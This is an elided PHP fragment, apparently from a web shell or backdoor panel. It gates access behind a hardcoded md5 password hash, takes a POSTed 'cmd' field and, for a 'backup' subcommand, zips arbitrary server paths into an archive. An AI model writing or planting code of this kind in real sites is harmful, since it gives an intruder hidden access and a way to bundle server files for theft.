...
if (!isset($_SESSION["logged_in"])) {
    ...
    if (isset($_POST["pass"])) {
        if(md5($_POST["pass"]) == "c84a6bd3d619414613c50d6c0779d1de") {
...
if (isset($_POST['cmd'])) {
    ...
    $zip_data = explode(' ', $_POST['cmd']);
    if ($zip_data[2] === 'backup') {

        if (isset($zip_data[3]) && isset($zip_data[4]) && $zip_data[3] && $zip_data[4]) {
            $result = zipData($zip_data[3], $zip_data[4]);
            if (!$result) {
                echo 'Something is wrong. Archive not created. <br>';
                echo 'Format: backup /path/to/source /path/to/backup.zip <br>';
                echo 'Is the php zip extension included? <br>';
            } else {
                echo 'Finished';
            }
        } else {
